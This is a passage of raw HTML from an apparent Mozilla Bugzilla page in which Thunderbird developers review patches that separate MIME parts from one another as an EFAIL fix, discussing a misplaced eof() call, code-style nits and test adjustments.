        Attachment description: Separate MIME parts from each other, v4 (trunk and 52) &rarr; Separate MIME parts from each other, v4 (trunk and 52) - not for landing, but contains code for TB 52 and 60.</div><div class="change">
        <a href="/attachment.cgi?id=8976349&amp;action=edit"
           title="Separate MIME parts from each other, v4 (trunk and 52)"
           class=""
        >Attachment #8976349</a> -
        Flags: <span class="activity-deleted">review-</span></div></div></div><div class="change-set" id="c160"><div class="comment" data-id="13293514" data-no="160"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-160" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15610803_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15610803_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-160"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-160" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c160">Comment 160</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 01:07 PDT" data-time="1526890066">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-160">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-160" data-comment-id="13293514">Comment on <span class=""><a href="/attachment.cgi?id=8979120" name="attach_8979120" title="Separate MIME parts from each other, v4b (trunk only, with clean-up)">attachment 8979120</a> <a href="/attachment.cgi?id=8979120&amp;action=edit" title="Separate MIME parts from each other, v4b (trunk only, with clean-up)">[details]</a> <a href="/attachment.cgi?id=8979120&amp;action=diff" title="Separate MIME parts from each other, v4b (trunk only, with clean-up)">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8979120'>[review]</a>
Separate MIME parts from each other, v4b (trunk only, with clean-up)

I think that was by mistake or perhaps due to the white-space changes Ben didn't like. For the record, currently 378 functions don't have a space before the parenthesis, 313 do. So the prevailing style is what this patch does. r- will only confuse Magnus, since the predecessor already had r+ and I fixed the Context issue here, and I'm just checking this is what Magnus meant.</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8979120&amp;action=edit"
           title="Separate MIME parts from each other, v4b (trunk only, with clean-up)"
           class=""
        >Attachment #8979120</a> -
        Flags: <span class="activity-deleted">review-</span></div></div></div><div class="change-set" id="c161"><div class="comment" data-id="13293541" data-no="161"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-161" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15610803_176914"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15610803_176914"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-161"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-161" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c161">Comment 161</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 01:41 PDT" data-time="1526892089">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-161">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-161" data-comment-id="13293541">I found the &lt;div&gt; problem.

The superclass parse_line() function was called correctly. However, in eol(), we called the superclass eof() function - which is what outputs the closing &lt;/div&gt; tag - at the *beginning* of the child function for HTMLParsed and HTMLSanitized. These classes need to buffer up everything in memory and - due to lacking streaming APIs in Gecko - parse it all at once in eof(), not in parse_line(). These 2 facts in combination meant that the &lt;/div&gt; was output before the actual HTML content. Once I realized that, it was trivial: Move the superclass function call of eof() to the end of the eof() child function, and it works.</pre></div><div class="change-set" id="c162"><div class="comment" data-id="13293593" data-no="162"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-162" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15610803_176914"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15610803_176914"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-162"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-162" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c162">Comment 162</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 02:25 PDT" data-time="1526894712">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-162">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8979183"
         class="attachment patch obsolete"
         data-id="8979183" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="efail-parse-html-5-for-52.diff">
      <meta itemprop="contentSize" content="16301">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached patch
          <meta itemprop="contentUrl" content="attachment.cgi?id=8979183">
          <a class="link" href="attachment.cgi?id=8979183&amp;action=diff">
        <span id="att-8979183-description" itemprop="description">Separate MIME parts from each other, v5 (for 52)</span></a> (obsolete)
        — <a href="attachment.cgi?id=8979183&amp;action=edit" itemprop="url">Details</a>
          — <a href="/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979183">Splinter Review</a>
      </div>
    </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8979120&amp;action=edit"
           title="Separate MIME parts from each other, v4b (trunk only, with clean-up)"
           class=""
        >Attachment #8979120</a> -
        Attachment is obsolete: true</div><div class="change">
        <a href="/attachment.cgi?id=8979120&amp;action=edit"
           title="Separate MIME parts from each other, v4b (trunk only, with clean-up)"
           class=""
        >Attachment #8979120</a> -
        Flags: <span class="activity-deleted">review?(mkmelin+mozilla)</span></div></div></div><div class="change-set" id="c163"><div class="comment" data-id="13293630" data-no="163"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-163" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15610803_176914"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15610803_176914"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-163"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-163" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c163">Comment 163</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 02:51 PDT" data-time="1526896271">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-163">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8979187"
         class="attachment patch obsolete"
         data-id="8979187" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="efail-parse-html-5-for-trunk.diff">
      <meta itemprop="contentSize" content="16060">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached patch
          <meta itemprop="contentUrl" content="attachment.cgi?id=8979187">
          <a class="link" href="attachment.cgi?id=8979187&amp;action=diff">
        <span id="att-8979187-description" itemprop="description">Separate MIME parts from each other, v5 (for trunk)</span></a> (obsolete)
        — <a href="attachment.cgi?id=8979187&amp;action=edit" itemprop="url">Details</a>
          — <a href="/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979187">Splinter Review</a>
      </div>
    </div></div><div class="change-set" id="c164"><div class="comment" data-id="13293722" data-no="164"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-164" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15610803_176914"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15610803_176914"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-164"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-164" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c164">Comment 164</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 03:15 PDT" data-time="1526897728">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-164">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8979190"
         class="attachment patch obsolete"
         data-id="8979190" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="efail-parse-html-5.1-for-trunk.diff">
      <meta itemprop="contentSize" content="15648">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached patch
          <meta itemprop="contentUrl" content="attachment.cgi?id=8979190">
          <a class="link" href="attachment.cgi?id=8979190&amp;action=diff">
        <span id="att-8979190-description" itemprop="description">Separate MIME parts from each other, v5.1 (for trunk)</span></a> (obsolete)
        — <a href="attachment.cgi?id=8979190&amp;action=edit" itemprop="url">Details</a>
          — <a href="/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979190">Splinter Review</a>
      </div>
    </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8979187&amp;action=edit"
           title="Separate MIME parts from each other, v5 (for trunk)"
           class=""
        >Attachment #8979187</a> -
        Attachment is obsolete: true</div></div></div><div class="change-set" id="c165"><div class="comment" data-id="13293733" data-no="165"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-165" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15610803_176914"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15610803_176914"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-165"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-165" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c165">Comment 165</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 03:22 PDT" data-time="1526898162">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-165">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8979192"
         class="attachment patch obsolete"
         data-id="8979192" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="efail-parse-html-5-for-52.diff">
      <meta itemprop="contentSize" content="15694">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached patch
          <meta itemprop="contentUrl" content="attachment.cgi?id=8979192">
          <a class="link" href="attachment.cgi?id=8979192&amp;action=diff">
        <span id="att-8979192-description" itemprop="description">Separate MIME parts from each other, v5.1 (for 52)</span></a> (obsolete)
        — <a href="attachment.cgi?id=8979192&amp;action=edit" itemprop="url">Details</a>
          — <a href="/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979192">Splinter Review</a>
      </div>
    </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8979183&amp;action=edit"
           title="Separate MIME parts from each other, v5 (for 52)"
           class=""
        >Attachment #8979183</a> -
        Attachment is obsolete: true</div></div></div><div class="change-set" id="c166"><div class="comment" data-id="13293743" data-no="166"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-166" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15610803_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15610803_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-166"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-166" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c166">Comment 166</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 03:28 PDT" data-time="1526898533">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-166">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-166" data-comment-id="13293743">Comment on <span class=""><a href="/attachment.cgi?id=8979122" name="attach_8979122" title="1419417-fix-tests.patch (v2)">attachment 8979122</a> <a href="/attachment.cgi?id=8979122&amp;action=edit" title="1419417-fix-tests.patch (v2)">[details]</a> <a href="/attachment.cgi?id=8979122&amp;action=diff" title="1419417-fix-tests.patch (v2)">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8979122'>[review]</a>
1419417-fix-tests.patch (v2)

If these changes appear reasonable, please r+ so we can move forward without waiting for Magnus' next time slot. I'll adjust it to Content-Type later.</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8979122&amp;action=edit"
           title="1419417-fix-tests.patch (v2)"
           class=""
        >Attachment #8979122</a> -
        Flags: review?(ben.bucksch)</div></div></div><div class="change-set" id="c167"><div class="comment" data-id="13293746" data-no="167"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-167" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15610803_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15610803_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-167"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-167" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c167">Comment 167</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 03:32 PDT" data-time="1526898746">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-167">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-167" data-comment-id="13293746">Comment on <span class="bz_obsolete"><a href="/attachment.cgi?id=8979190" name="attach_8979190" title="Separate MIME parts from each other, v5.1 (for trunk)">attachment 8979190</a> <a href="/attachment.cgi?id=8979190&amp;action=edit" title="Separate MIME parts from each other, v5.1 (for trunk)">[details]</a> <a href="/attachment.cgi?id=8979190&amp;action=diff" title="Separate MIME parts from each other, v5.1 (for trunk)">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8979190'>[review]</a>
Separate MIME parts from each other, v5.1 (for trunk)

Review of <span class="bz_obsolete"><a href="/attachment.cgi?id=8979190" name="attach_8979190" title="Separate MIME parts from each other, v5.1 (for trunk)">attachment 8979190</a> <a href="/attachment.cgi?id=8979190&amp;action=edit" title="Separate MIME parts from each other, v5.1 (for trunk)">[details]</a> <a href="/attachment.cgi?id=8979190&amp;action=diff" title="Separate MIME parts from each other, v5.1 (for trunk)">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8979190'>[review]</a>:
-----------------------------------------------------------------

Please align the code with mimethsa.cpp. Sadly, I had already done so, but the changes got lost.

I'll put it all together and start a try after lunch.

::: mailnews/mime/src/mimeTextHTMLParsed.cpp
&#64;&#64; +59,5 &#64;&#64;
<span class="quote">&gt; +  int status = ((MimeObjectClass*)&amp;MIME_SUPERCLASS)-&gt;parse_begin(obj);
&gt; +  if (status &lt; 0)
&gt; +    return status;
&gt; +
&gt; +  // charset</span >

Remove that line.

&#64;&#64; +60,5 &#64;&#64;
<span class="quote">&gt; +  if (status &lt; 0)
&gt; +    return status;
&gt; +
&gt; +  // charset
&gt; +  // dump the charset we get from the mime headers into a HTML &lt;meta http-equiv&gt;</span >

Sentence/upper case with full stop.

&#64;&#64; +107,5 &#64;&#64;
<span class="quote">&gt; +  nsString&amp; rawHTML = *(me-&gt;complete_buffer);
&gt; +  nsString parsed;
&gt; +  nsresult rv;
&gt; +
&gt; +  // Parse the HTML source</span >

Full stop.

&#64;&#64; +116,5 &#64;&#64;
<span class="quote">&gt; +    rawHTML, mozilla::dom::SupportedType::Text_html, rv2);
&gt; +  if (rv2.Failed())
&gt; +    return -1;
&gt; +
&gt; +  // Serialize it back to HTML source again</span >

and here.

&#64;&#64; +125,5 &#64;&#64;
<span class="quote">&gt; +  NS_ENSURE_SUCCESS(rv, -1);
&gt; +  rv = encoder-&gt;EncodeToString(parsed);
&gt; +  NS_ENSURE_SUCCESS(rv, -1);
&gt; +
&gt; +  // Write it out</span >

and here.</pre></div><div class="change-set" id="c168"><div class="comment" data-id="13293757" data-no="168"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-168" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_101158" id="a15610803_176914"><img src="https://secure.gravatar.com/avatar/18eb16a976feb4b40d839c5e9036bc3a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_101158" id="a15610803_176914"><a class="email " href="/user_profile?user_id=101158" > <span class="fna">Magnus Melin [:mkmelin]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-168"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-168" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c168">Comment 168</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 03:46 PDT" data-time="1526899614">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-168">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-168" data-comment-id="13293757">Comment on <span class="bz_obsolete"><a href="/attachment.cgi?id=8979123" name="attach_8979123" title="1419417-fix-mimethsa.patch [landed in bug 1462481 comment #11]">attachment 8979123</a> <a href="/attachment.cgi?id=8979123&amp;action=edit" title="1419417-fix-mimethsa.patch [landed in bug 1462481 comment #11]">[details]</a> <a href="/attachment.cgi?id=8979123&amp;action=diff" title="1419417-fix-mimethsa.patch [landed in bug 1462481 comment #11]">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8979123'>[review]</a>
1419417-fix-mimethsa.patch [landed in <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - HTML Sanitizer class cleanup"
   href="/show_bug.cgi?id=1462481#c11">bug 1462481 comment #11</a>]

Review of <span class="bz_obsolete"><a href="/attachment.cgi?id=8979123" name="attach_8979123" title="1419417-fix-mimethsa.patch [landed in bug 1462481 comment #11]">attachment 8979123</a> <a href="/attachment.cgi?id=8979123&amp;action=edit" title="1419417-fix-mimethsa.patch [landed in bug 1462481 comment #11]">[details]</a> <a href="/attachment.cgi?id=8979123&amp;action=diff" title="1419417-fix-mimethsa.patch [landed in bug 1462481 comment #11]">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8979123'>[review]</a>:
-----------------------------------------------------------------

I meant to remove the outputting of meta http-equiv here since it looked wrong.
I think it's proof enough if it has been there and with a typo all these years making it a no-op, that my hunch was correct ;)</pre></div><div class="change-set" id="c169"><div class="comment" data-id="13293758" data-no="169"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-169" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_101158" id="a15610803_176914"><img src="https://secure.gravatar.com/avatar/18eb16a976feb4b40d839c5e9036bc3a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_101158" id="a15610803_176914"><a class="email " href="/user_profile?user_id=101158" > <span class="fna">Magnus Melin [:mkmelin]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-169"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-169" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c169">Comment 169</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 03:49 PDT" data-time="1526899756">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-169">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-169" data-comment-id="13293758">Comment on <span class=""><a href="/attachment.cgi?id=8979122" name="attach_8979122" title="1419417-fix-tests.patch (v2)">attachment 8979122</a> <a href="/attachment.cgi?id=8979122&amp;action=edit" title="1419417-fix-tests.patch (v2)">[details]</a> <a href="/attachment.cgi?id=8979122&amp;action=diff" title="1419417-fix-tests.patch (v2)">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8979122'>[review]</a>
1419417-fix-tests.patch (v2)

Review of <span class=""><a href="/attachment.cgi?id=8979122" name="attach_8979122" title="1419417-fix-tests.patch (v2)">attachment 8979122</a> <a href="/attachment.cgi?id=8979122&amp;action=edit" title="1419417-fix-tests.patch (v2)">[details]</a> <a href="/attachment.cgi?id=8979122&amp;action=diff" title="1419417-fix-tests.patch (v2)">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8979122'>[review]</a>:
-----------------------------------------------------------------

If this is needed for the tests too be happy, looks reasonable. 

Please though Upper-Case the content-type to Content-Type. Lowercase looks so ugly.</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8979122&amp;action=edit"
           title="1419417-fix-tests.patch (v2)"
           class=""
        >Attachment #8979122</a> -
        Flags: review?(mkmelin+mozilla) &rarr; review+</div></div></div><div class="change-set" id="c170"><div class="comment" data-id="13293759" data-no="170"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-170" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15610803_176914"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15610803_176914"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-170"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-170" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c170">Comment 170</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 03:50 PDT" data-time="1526899835">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-170">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-170" data-comment-id="13293759">Comment on <span class=""><a href="/attachment.cgi?id=8979122" name="attach_8979122" title="1419417-fix-tests.patch (v2)">attachment 8979122</a> <a href="/attachment.cgi?id=8979122&amp;action=edit" title="1419417-fix-tests.patch (v2)">[details]</a> <a href="/attachment.cgi?id=8979122&amp;action=diff" title="1419417-fix-tests.patch (v2)">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8979122'>[review]</a>
1419417-fix-tests.patch (v2)

+    // Account for stuff added by libmime, incl. two CRLF or LF before and after.
+    totalSize += &quot;&lt;meta http-equiv=\&quot;content-type\&quot; content=\&quot;text\/html; \&quot;&gt;&quot;.length;
+    totalSize += (&quot;&#64;mozilla.org/windows-registry-key;1&quot; in Cc) ? 4 : 2;

I don't think it's good idea to hardcode the number of linebreaks and that &quot;windows-registry-key&quot; test is a hard-to-read and failure-prone way to say &quot;this is Windows&quot;.

I would recommend to do what you did in the second test: before calculating the string size, simply remove the &lt;meta&gt; tag (if it exists) - which would still work and not break the test, if we would go back to the old way, which I anticipate - and you can do the same with the LFCR, by simply removing all LF before getting the size.

However, I don't want to be a pain like some other reviewers :-), and I don't care about these tests, so giving you an r+ anyway. I think what I said should be fixed, but it doesn't have to be right now. It's most important to get the fix out.</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8979122&amp;action=edit"
           title="1419417-fix-tests.patch (v2)"
           class=""
        >Attachment #8979122</a> -
        Flags: <span class="activity-deleted">review?(ben.bucksch)</span></div><div class="change">
        <a href="/attachment.cgi?id=8979122&amp;action=edit"
           title="1419417-fix-tests.patch (v2)"
           class=""
        >Attachment #8979122</a> -
        Flags: <span class="activity-deleted">review+</span></div></div></div><div class="change-set" id="c171"><div class="comment" data-id="13293760" data-no="171"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-171" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15610803_176914"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15610803_176914"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-171"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-171" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c171">Comment 171</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 03:51 PDT" data-time="1526899914">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-171">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-171" data-comment-id="13293760">Sorry, I walked over Magnus's r+. You can keep both.
But I second what Magnus said, too.</pre></div><div class="change-set" id="c172"><div class="comment" data-id="13293790" data-no="172"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-172" role="presentation">
      <tr>
